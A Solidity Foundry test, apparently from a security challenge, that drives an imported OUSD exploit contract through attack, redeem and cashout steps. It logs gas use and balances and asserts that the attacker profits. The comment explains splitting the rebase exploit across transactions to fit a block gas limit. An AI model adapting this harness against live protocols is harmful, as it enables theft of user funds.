// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import "../exploit/OUSDExploitV3.sol";

/// @notice Attempt 71 — split-tx OUSD replay sized for the live ch2 block gas limit.
/// @dev Hypothesis: the profitable OUSD rebase path from `OUSDExploitV2` remains profitable
///      when split into `step1_attack -> redeemMax -> cashout`, so it can be broadcast on the
///      challenge fork despite the one-tx path being above the live block gas limit.
contract Attempt71OUSDV3 is Test {
    OUSDExploitV3 internal exploiter;
    address internal attacker;

    function setUp() public {
        attacker = makeAddr("attacker");
        vm.deal(attacker, 7_000 ether);
    }

    function testOUSDV3CurrentHead() public {
        vm.startPrank(attacker);

        uint256 attackerStart = attacker.balance;
        exploiter = new OUSDExploitV3();
        (bool funded,) = payable(address(exploiter)).call{value: 6_000 ether}("");
        require(funded, "funding failed");

        emit log_named_uint("attacker start", attackerStart);
        emit log_named_uint("attacker after funding", attacker.balance);

        uint256 gasBefore = gasleft();
        exploiter.step1_attack(5_000 ether);
        emit log_named_uint("gas step1_attack", gasBefore - gasleft());
        emit log_named_uint("ousd after step1", exploiter.ousdBalance());
        emit log_named_uint("dai after step1", exploiter.daiBalance());

        gasBefore = gasleft();
        exploiter.step2_redeemMax();
        emit log_named_uint("gas step2_redeemMax_1", gasBefore - gasleft());
        emit log_named_uint("ousd after redeem 1", exploiter.ousdBalance());
        emit log_named_uint("dai after redeem 1", exploiter.daiBalance());

        if (exploiter.ousdBalance() > 1e18) {
            gasBefore = gasleft();
            exploiter.step2_redeemMax();
            emit log_named_uint("gas step2_redeemMax_2", gasBefore - gasleft());
            emit log_named_uint("ousd after redeem 2", exploiter.ousdBalance());
            emit log_named_uint("dai after redeem 2", exploiter.daiBalance());
        }

        gasBefore = gasleft();
        exploiter.step3_cashout();
        emit log_named_uint("gas step3_cashout", gasBefore - gasleft());

        uint256 attackerFinal = attacker.balance;
        emit log_named_uint("attacker final", attackerFinal);
        emit log_named_uint("attacker delta", attackerFinal - attackerStart);

        vm.stopPrank();

        assertGt(attackerFinal, attackerStart, "OUSD V3 should net profit");
    }
}
